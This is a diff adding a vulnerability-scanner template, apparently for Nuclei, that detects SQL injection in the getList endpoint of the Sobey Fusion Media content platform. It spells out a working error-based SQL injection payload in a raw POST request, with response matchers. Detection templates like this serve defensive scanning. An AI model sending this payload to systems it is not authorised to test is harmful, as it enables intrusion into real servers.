@@ -1,0 +1,32 @@
+id: poc-yaml-sobey-imcmp-getlist-sqli
+info:
+  name: Sobey Fusion Media Content Management Platform getList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    vendor: Sobey
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/mch/Articlelist/getList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        catalogid=1 AND GTID_SUBSET(CONCAT(md5({{t1}}),(SELECT (ELT(9852=9852,0x7e))),0x7e),9852)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Sobey"
+          - "{{t2}}~~"
+          - "java.sql.SQLException"
